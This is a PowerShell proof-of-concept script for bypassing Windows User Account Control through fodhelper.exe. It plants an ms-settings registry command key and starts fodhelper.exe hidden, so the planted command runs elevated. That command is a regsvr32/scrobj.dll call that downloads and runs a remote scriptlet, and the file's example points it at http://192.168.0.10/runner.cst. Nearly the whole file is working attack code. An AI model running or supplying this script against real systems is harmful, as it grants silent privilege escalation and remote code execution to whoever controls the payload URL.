<#
.SYNOPSIS
	This script is a proof of concept to bypass the User Access Control (UAC) via fodhelper.exe
	It creates a new registry structure in: "HKCU:\Software\Classes\ms-settings\" to perform an UAC bypass to start any application.
	ATTENTION: Do not try this on your productive machine!
.NOTES
	Function   : FodhelperBypass
	File Name  : FodhelperBypass.ps1
	Author     : Gushmazuko | Christian B. - winscripting.blog
.LINK
	https://github.com/gushmazuko/WinBypass/blob/master/FodhelperBypass.ps1
	Original source: https://github.com/winscripting/UAC-bypass
.EXAMPLE
	Load "regsvr32 -s -n -u -i:http://192.168.0.10/runner.cst scrobj.dll" (By Default used 'arch 64'):
	FodhelperBypass -http "http://192.168.0.10/runner.cst" -arch 64
#>

function FodhelperBypass(){
	Param (
	
		[Parameter(Mandatory=$True)]
		[String]$http,
		[ValidateSet(64,86)]
		[int]$arch = 64
	)
	
	$program = "regsvr32 -s -n -u -i:$http scrobj.dll"

	#Create registry structure
	New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
	New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
	Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

	#Perform the bypass
	switch($arch)
	{
		64
		{
			#x64 shell in Windows x64 | x86 shell in Windows x86
			Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
		}
		86
		{
			#x86 shell in Windows x64
			C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden"
		}
	}

	#Remove registry structure
	Start-Sleep 3
	Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}
